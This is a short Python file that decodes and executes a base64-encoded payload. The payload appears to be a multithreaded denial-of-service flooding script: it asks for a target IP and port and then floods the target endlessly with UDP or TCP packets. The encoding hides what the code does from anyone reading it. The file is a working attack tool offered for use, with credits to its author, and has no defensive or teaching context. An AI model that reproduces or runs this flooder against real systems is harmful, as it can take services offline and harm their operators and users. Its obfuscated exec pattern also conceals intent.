import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHRocmVhZGluZw0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQoNCm9zLnN5c3RlbSgiY2xlYXIiKQ0KcHJpbnQoIiIiXDAzM1s5Mm0NCiAgXyAgX18gICBfX18gICAgXyAgIF8gICBfX19fXyAgICBfX18gICAgXyAgICAgDQogfCB8LyAvICAvIF8gXCAgfCBcIHwgfCB8XyAgIF98ICAvIF8gXCAgfCB8ICAgIA0KIHwgJyAvICB8IHwgfCB8IHwgIFx8IHwgICB8IHwgICB8IHwgfCB8IHwgfCAgICANCiB8IC4gXCAgfCB8X3wgfCB8IHxcICB8ICAgfCB8ICAgfCB8X3wgfCB8IHxfX18gDQogfF98XF9cICBcX19fLyAgfF98IFxffCAgIHxffCAgICBcX19fLyAgfF9fX19ffA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiKQ0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpDQpwcmludCgiIHwgQVVUSE9SIDogWmVlWHlaIikNCnByaW50KCIgfCBHSVRIVUIgOiBodHRwczovL2dpdGh1Yi5jb20vWmVlWHl6Wi9EZG9zIikNCnByaW50KCIgfCBESVNDT1JEIDogISBaZWVYeVojMzA3MiAgICAgICAgICAgICAgICAgICIpDQpwcmludCgiIHwgTVkgVEVBTSA6IGh0dHBzOi8vZGlzY29yZC5nZy91R3BESHZhdTVBIikNCnByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKQ0KaXAgPSBzdHIoaW5wdXQoIiBJUCBUQVJHRVQ6IikpDQpwb3J0ID0gaW50KGlucHV0KCIgUE9SVDoiKSkNCmNob2ljZSA9IHN0cihpbnB1dCgiIEdBUyBERE9TPyh5L24pOiIpKQ0KdGltZXMgPSBpbnQoaW5wdXQoIiBQQUNLRVQ6IikpDQp0aHJlYWRzID0gaW50KGlucHV0KCIgSVNJIFBBQ0tFVDoiKSkNCmRlZiBydW4oKToNCiAgICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDg3NDUpDQogICAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbVE9LISEhIFRPSyEhIV0iLCJbVE9LISEhIFRPSyEhIV0iKSkNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pDQogICAgICAgICAgICBhZGRyID0gKHN0cihpcCksaW50KHBvcnQpKQ0KICAgICAgICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOg0KICAgICAgICAgICAgICAgIHMuc2VuZHRvKGRhdGEsYWRkcikNCiAgICAgICAgICAgIHByaW50KGYiU2VuZCBwYWNrZXQgdG8ge2lwfSBvbiBwb3J0IHtwb3J0fSIpDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHByaW50KCJbI10gU0VSVkVSIElTIERPV04hISEiKQ0KDQpkZWYgcnVuMigpOg0KICAgIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTYpDQogICAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbVE9LISEhIFRPSyEhIV0iLCJbVE9LISEhIFRPSyEhIV0iKSkNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgICAgICAgcy5jb25uZWN0KChpcCxwb3J0KSkNCiAgICAgICAgICAgIHMuc2VuZChkYXRhKQ0KICAgICAgICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOg0KICAgICAgICAgICAgICAgIHMuc2VuZChkYXRhKQ0KICAgICAgICAgICAgcHJpbnQoZiJTZW5kIHBhY2tldCB0byB7aXB9IG9uIHBvcnQge3BvcnR9IikNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcy5jbG9zZSgpDQogICAgICAgICAgICBwcmludCgiWyNdIFNFUlZFUiBJUyBET1dOISEhIikNCiAgICAgICAgDQpmb3IgeSBpbiByYW5nZSh0aHJlYWRzKToNCiAgICBpZiBjaG9pY2UgPT0gJ3knOg0KICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQ0KICAgICAgICB0aC5zdGFydCgpDQogICAgZWxzZToNCiAgICAgICAgdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bjIpDQogICAgICAgIHRoLnN0YXJ0KCk='))